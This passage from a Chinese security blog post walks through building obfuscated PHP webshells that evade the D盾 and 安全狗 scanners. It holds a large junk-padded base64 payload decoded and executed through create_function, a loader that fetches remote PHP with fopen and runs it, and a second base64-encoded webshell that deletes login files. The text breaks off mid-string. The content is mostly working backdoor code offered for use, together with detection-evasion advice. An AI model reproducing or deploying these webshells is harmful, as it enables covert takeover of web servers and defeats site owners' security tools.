牛逼7卢本伟牛逼C卢本伟牛逼g卢本伟牛逼o卢本伟牛逼k卢本伟牛逼d卢本伟牛逼X卢本伟牛逼J卢本伟牛逼s卢本伟牛逼L卢本伟牛逼j卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼N卢本伟牛逼y卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼1卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼N卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼w卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼U卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼x卢本伟牛逼N卢本伟牛逼y卢本伟牛逼k卢本伟牛逼7卢本伟牛逼C卢本伟牛逼g卢本伟牛逼o卢本伟牛逼k卢本伟牛逼d卢本伟牛逼X卢本伟牛逼J卢本伟牛逼s卢本伟牛逼L卢本伟牛逼j卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼I卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼O卢本伟牛逼T卢本伟牛逼k卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼Q卢本伟牛逼2卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼5卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼x卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼1卢本伟牛逼c卢本伟牛逼m卢本伟牛逼w卢本伟牛逼u卢本伟牛逼P卢本伟牛逼S卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼D卢本伟牛逼c卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼5卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼5卢本伟牛逼N卢本伟牛逼y卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼z卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼1卢本伟牛逼c卢本伟牛逼m卢本伟牛逼w卢本伟牛逼u卢本伟牛逼P卢本伟牛逼S卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼M卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼1卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼N卢本伟牛逼y卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼T卢本伟牛逼A卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼Q卢本伟牛逼4卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼T卢本伟牛逼U卢本伟牛逼p卢本伟牛逼O卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼H卢本伟牛逼V卢本伟牛逼y卢本伟牛逼b卢本伟牛逼C卢本伟牛逼4卢本伟牛逼9卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼D卢本伟牛逼c卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼Q卢本伟牛逼4卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼1卢本伟牛逼M卢本伟牛逼y卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼D卢本伟牛逼c卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼U卢本伟牛逼w卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼D卢本伟牛逼c卢本伟牛逼p卢本伟牛逼O卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼H卢本伟牛逼V卢本伟牛逼y卢本伟牛逼b卢本伟牛逼C卢本伟牛逼4卢本伟牛逼9卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼4卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼O卢本伟牛逼D卢本伟牛逼E卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼g卢本伟牛逼y卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼z卢本伟牛逼c卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼Q卢本伟牛逼2卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼M卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼y卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼n卢本伟牛逼Z卢本伟牛逼X卢本伟牛逼Q卢本伟牛逼9卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼M卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼O卢本伟牛逼C卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼M卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼k卢本伟牛逼1卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼n卢本伟牛逼Z卢本伟牛逼X卢本伟牛逼Q卢本伟牛逼u卢本伟牛逼P卢本伟牛逼W卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼M卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼E卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼Y卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼5卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼k卢本伟牛逼5卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼n卢本伟牛逼Z卢本伟牛逼X卢本伟牛逼Q卢本伟牛逼u卢本伟牛逼P卢本伟牛逼W卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼Y卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼E卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼p卢本伟牛逼O卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼G卢本伟牛逼d卢本伟牛逼l卢本伟牛逼d卢本伟牛逼C卢本伟牛逼4卢本伟牛逼9卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼x卢本伟牛逼N卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼x卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼7卢本伟牛逼C卢本伟牛逼g卢本伟牛逼o卢本伟牛逼k卢本伟牛逼X卢本伟牛逼1卢本伟牛逼N卢本伟牛逼F卢本伟牛逼U卢本伟牛逼1卢本伟牛逼N卢本伟牛逼J卢本伟牛逼T卢本伟牛逼0卢本伟牛逼5卢本伟牛逼b卢本伟牛逼J卢本伟牛逼1卢本伟牛逼B卢本伟牛逼o卢本伟牛逼c卢本伟牛逼E卢本伟牛逼N卢本伟牛逼v卢本伟牛逼Z卢本伟牛逼G卢本伟牛逼U卢本伟牛逼n卢本伟牛逼X卢本伟牛逼T卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Z卢本伟牛逼2卢本伟牛逼V卢本伟牛逼0卢本伟牛逼K卢本伟牛逼C卢本伟牛逼R卢本伟牛逼1卢本伟牛逼c卢本伟牛逼m卢本伟牛逼w卢本伟牛逼p卢本伟牛逼O卢本伟牛逼3卢本伟牛逼0卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼1卢本伟牛逼b卢本伟牛逼j卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼M卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼y卢本伟牛逼M卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼1卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼p卢本伟牛逼O卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼H卢本伟牛逼V卢本伟牛逼u卢本伟牛逼L卢本伟牛逼j卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼I卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼O卢本伟牛逼C卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼O卢本伟牛逼T卢本伟牛逼c卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼x卢本伟牛逼N卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼Y卢本伟牛逼m卢本伟牛逼F卢本伟牛逼z卢本伟牛逼Z卢本伟牛逼T卢本伟牛逼Y卢本伟牛逼0卢本伟牛逼X卢本伟牛逼2卢本伟牛逼R卢本伟牛逼l卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼9卢本伟牛逼k卢本伟牛逼Z卢本伟牛逼S卢本伟牛逼g卢本伟牛逼n卢本伟牛逼T卢本伟牛逼V卢本伟牛逼R卢本伟牛逼B卢本伟牛逼e卢本伟牛逼C卢本伟牛逼c卢本伟牛逼p卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼k卢本伟牛逼B卢本伟牛逼l卢本伟牛逼d卢本伟牛逼m卢本伟牛逼F卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼R卢本伟牛逼1卢本伟牛逼b卢本伟牛逼i卢本伟牛逼g卢本伟牛逼k卢本伟牛逼X卢本伟牛逼1卢本伟牛逼N卢本伟牛逼F卢本伟牛逼U卢本伟牛逼1卢本伟牛逼N卢本伟牛逼J卢本伟牛逼T卢本伟牛逼0卢本伟牛逼5卢本伟牛逼b卢本伟牛逼J卢本伟牛逼1卢本伟牛逼B卢本伟牛逼o卢本伟牛逼c卢本伟牛逼E卢本伟牛逼N卢本伟牛逼v卢本伟牛逼Z卢本伟牛逼G卢本伟牛逼U卢本伟牛逼n卢本伟牛逼X卢本伟牛逼S卢本伟牛逼k卢本伟牛逼p卢本伟牛逼O卢本伟牛逼w卢本伟牛逼=卢本伟牛逼=卢本伟牛逼&quot;;</span><br><span class="line">$zz=gg();</span><br><span class="line">$th=str_replace(&quot;卢本伟牛逼&quot;,&quot;&quot;,$a); /*卢本伟牛逼去除后，拼接起了大马*/</span><br><span class="line">$ba64 = strrev(&apos;eDoCEd_46EsAb&apos;); /*反转base64解密函数*/</span><br><span class="line">$ouni=$zz(&apos;&apos;,$ba64($th)); /*eval执行,相当于create_function(&apos;&apos;,base64_decode($th))*/</span><br><span class="line">$ouni();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>方法也是一样的</p><p><img src="https://s2.ax1x.com/2019/01/13/FxPpZV.png" alt="FxPpZV.png"></p><p><img src="https://s2.ax1x.com/2019/01/13/FxP9aT.png" alt="FxP9aT.png"></p><p>然后此时，墨师父突然传送回家，并说道：这不是老套路吗。然后扔了一个更牛逼的操作出来<br>吓得我开了个写轮眼着手打开。</p><p>传送门：<a href="https://www.inksec.cn/2018/07/20/bypass_shell_3/" target="_blank" rel="noopener">打造一款1kb大马并且处理D盾以及安全狗拦截与查杀</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">墨师父的思路是利用fopen远程打开webshell.txt</span><br><span class="line">然后读取里面的php代码在进入eval执行</span><br></pre></td></tr></table></figure><p>这里我改了一下，用create_function()执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function MonkeySun()&#123;</span><br><span class="line">    return str_replace(&quot;两开花&quot;, &quot;&quot;, &quot;两开花c两开花R两开花e两开花Ate两开花_Fun两开花CtI两开花oN&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$cre =MonkeySun();</span><br><span class="line">$handle1 = fopen(&apos;http://127.0.0.1/wc.txt&apos;, &apos;r&apos;); /*读取本地的wc.txt*/</span><br><span class="line">$content1 = &apos;&apos;;</span><br><span class="line">while(false != ($a1 = fread($handle1, 800)))&#123; /*如果返回结果不为false*/</span><br><span class="line">    $content1 .= $a1;</span><br><span class="line">&#125;</span><br><span class="line">$object=$cre(&apos;&apos;,$content1); /*替换了两开花拼接了create_finction()函数，create_function($content1)*/</span><br><span class="line">$object();</span><br><span class="line">fclose($handle1);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/13/FxPGQA.png" alt="D"></p><p><img src="https://s2.ax1x.com/2019/01/13/FxPYLt.md.png" alt="FxPYLt.md.png"></p><p>此时墨师父看完我写的代码后，说了一句。太长了，哪有那么长，我的eval()就是eval那用做什么让扰乱。然后给我们开了一波车，虽然这波车很飘，但后面还是过了D盾。</p><p>然后我明白了过D盾的真正思路，如同尼玛佐助开了永恒万花筒一样牛皮</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">过D盾处理的是</span><br><span class="line">1.处理关键不在于函数，在于传参内容</span><br><span class="line">2.不杀代码执行函数，杀函数带参</span><br></pre></td></tr></table></figure><p>新的操作:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$z=&quot;&quot;;</span><br><span class="line">$a=&apos;ZXJyb3JfcmVwb3J0aW5nKEVfRVJST1IpOwp1bmxpbmsoJ3VzZXIucGhwJyk7CnVubGluaygnLi4vbWVtYmVyL2xvZ2luLnBocCcpOwpAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCdPZmYnKTsKQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMjAwMDApOwpAaW5pX3NldCgnbWVtb3J5X2xpbWl0JywnMjU2TScpOwpoZWFkZXIoImNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Iik7CiRwYXNzd29yZCA9ICIyMTIzMmYyOTdhNTdhNWE3NDM4OTRhMGU0YTgwMWZjMyI7IC8vVml2LCBiZWJlZ2ltLi4KZGVmaW5lKCdWaXYsIGJlYmVnaW0uJywnRGVuemVsLeS9oOeahOiLsembhCcpOyAvLyDmoIfpopgKZnVuY3Rpb24gcygpewoJJHN0ciA9ICI2Njc1NnI2Mzc0Njk2czZyMjA3Mzc0NzI2NDY5NzIyODI0NzM3NDcyMjkyMDdvMjA3MjY1NzQ3NTcyNnIyMDczNzQ3MjVzNzI2NTcwNnA2MTYzNjUyODYxNzI3MjYxNzkyODI3NXA1cDI3MnAyNzJzMnMyNzJwMjcyNTMyMzcyNzJwMjcyNTMyMzIyNzI5MnA2MTcyNzI2MTc5MjgyNzJzMjcycDI3MnMyNzJwMjc1cDI3MjcycDI3MjIyNzI5MnA2MzY4NnM3MDI4MjQ3Mzc0NzIyOTI5M28yMDdxMHEwbjY2NzU2cjYzNzQ2OTZzNnIyMDYzNjg2bzY3NzA2MzI4MjQ2MTcyNzI2MTc5MjkyMDdvMjA2NjZzNzI2NTYxNjM2ODI4MjQ2MTcyNzI2MTc5MjA2MTczMjAyNDZvNjU3OTIwM3EzcjIwMjQ3NjYxNzIyOTIwN28yMDI0NjE3MjcyNjE3OTVvMjQ2bzY1Nzk1cTIwM3EyMDY5NzM1czYxNzI3MjYxNzkyODI0NzY2MTcyMjkyMDNzMjA2MzY4Nm82NzcwNjMyODI0NzY2MTcyMjkyMDNuMjA3Mzc0NzI2OTcwNzM2cDYxNzM2ODY1NzMyODI0NzY2MTcyMjkzbzIwN3EyMDcyNjU3NDc1NzI2cjIwMjQ2MTcyNzI2MTc5M28yMDdxMHEwbjI0NnE3OTY2Njk2cDY1MjAzcTIwMjQ1czUzNDU1MjU2NDU1MjVvMjc1MzQzNTI0OTUwNTQ1czQ2NDk0cDQ1NHI0MTRxNDUyNzVxMjAzczIwNzM3NDcyNjQ2OTcyMjgyNDVzNTM0NTUyNTY0NTUyNW8yNzUzNDM1MjQ5NTA1NDVzNDY0OTRwNDU0cjQxNHE0NTI3NXEyOTIwM24yMDczNzQ3MjY0Njk3MjI4NXM1czQ2NDk0cDQ1NXM1czI5M28wcTBuMjQ2cTc5NjY2OTZwNjUyMDNxMjA3Mzc0NzI3MDZzNzMyODI0NnE3OTY2Njk2cDY1MnAyNzY1NzY2MTZwMjgyOTI3MjkyMDNzMjA2MTcyNzI2MTc5NXM3MzY4Njk2Njc0Mjg2NTc4NzA2cDZzNjQ2NTI4MjcyODI3MnAyNDZxNzk2NjY5NnA2NTI5MjkyMDNuMjAyNDZxNzk2NjY5NnA2NTNvMHEwbjY0NjU2NjY5NnI2NTI4Mjc1NDQ4NDk1MzQ0NDk1MjI3MnA3Mzc0NzI2NDY5NzIyODY0Njk3MjZyNjE2cTY1MjgyNDZxNzk2NjY5NnA2NTI5MnIyNzJzMjcyOTI5M28wcTBuNjQ2NTY2Njk2cjY1MjgyNzUyNHM0czU0NDQ0OTUyMjcycDczNzQ3MjY0Njk3MjI4NzM3NDcyNzQ3MjI4MjQ2cTc5NjY2OTZwNjUycDYxNzI3MjYxNzkyODczNzQ3MjY0Njk3MjI4MjQ1czUzNDU1MjU2NDU1MjVvMjc1MDQ4NTA1czUzNDU0cDQ2Mjc1cTI5MjAzcTNyMjAyNzI3MjkyOTJyMjcyczI3MjkyOTNvMHEwbjY0NjU2NjY5NnI2NTI4Mjc0NTU4NDk1MzU0NTM1czUwNDg1MDQ5NHI0NjRzMjcycDY3NjU3NDY5NnI2NjZzMjgyOTIwM3MyMDc0NzI3NTY1MjAzbjIwNjY2MTZwNzM2NTI5M28wcTBuNjk2NjI4Njc2NTc0NXM2cTYxNjc2OTYzNXM3MTc1NnM3NDY1NzM1czY3NzA2MzI4MjkyOTIwN28yMDI0NXM1MDRzNTM1NDIwM3EyMDYzNjg2bzY3NzA2MzI4MjQ1czUwNHM1MzU0MjkzbzIwN3EwcTBuNjk2NjI4NjY3NTZyNjM3NDY5NnM2cjVzNjU3ODY5NzM3NDczMjgyNzZxNzk3MzcxNnA1czYzNnA2czczNjUyNzI5MjkyMDdvMjAyNDY5NzM3MzcxNnAyMDNxMjAyNzRxNzk1MzcxNnAyNzNvMjA3cTBxMG42OTY2Mjg2Njc1NnI2Mzc0Njk2czZyNXM2NTc4Njk3Mzc0NzMyODI3NnE3MzczNzE2cDVzNjM2cDZzNzM2NTI3MjkyOTIwMjQ2OTczNzM3MTZwMjAycjNxMjAyNzIwMnEyMDRxNzM1MzcxNnAyNzNvMHEwbjY5NjYyODY2NzU2cjYzNzQ2OTZzNnI1czY1Nzg2OTczNzQ3MzI4Mjc2czYzNjk1czYzNnA2czczNjUyNzI5MjkyMDI0Njk3MzczNzE2cDIwMnIzcTIwMjcyMDJxMjA0czcyNjE2MzZwNjUyNzNvMHEwbjY5NjYyODY2NzU2cjYzNzQ2OTZzNnI1czY1Nzg2OTczNzQ3MzI4Mjc3Mzc5NjI2MTczNjU1czYzNnA2czczNjUyNzI5MjkyMDI0Njk3MzczNzE2cDIwMnIzcTIwMjcyMDJxMjA1Mzc5NDI2MTczNjUyNzNvMHEwbjY5NjYyODY2NzU2cjYzNzQ2OTZzNnI1czY1Nzg2OTczNzQ3MzI4Mjc3MDY3NXM2MzZwNnM3MzY1MjcyOTI5MjAyNDY5NzM3MzcxNnAyMDJyM3EyMDI3MjAycTIwNTA2czczNzQ2NzcyNjU1MzcxNnAyNzNvMHEwbjI0Nzc2OTZyMjAzcTIwNzM3NTYyNzM3NDcyMjg1MDQ4NTA1czRzNTMycDMwMnAzMzI5MjAzcTNxMjAyNzU3NDk0cjI3MjAzczIwNzQ3Mjc1NjUyMDNuMjA2NjYxNnA3MzY1M28wcTBuMjQ2cTczNjcyMDNxMjA1NjQ1NTI1MzQ5NHM0cjNvMHEwbjBxMG42Njc1NnI2Mzc0Njk2czZyMjA2NjY5NnA2NTc3MjgyNDY2Njk2cDY1NnI2MTZxNjUycDI0NjY2OTZwNjU2NDYxNzQ2MTJwMjQ2NjY5NnA2NTZxNnM2NDY1MjkyMDdvMHEwbjA5Njk2NjI4MjgyMTY5NzM1czc3NzI2OTc0NjE2MjZwNjUyODI0NjY2OTZwNjU2cjYxNnE2NTI5MjkyMDI2MjYyMDY2N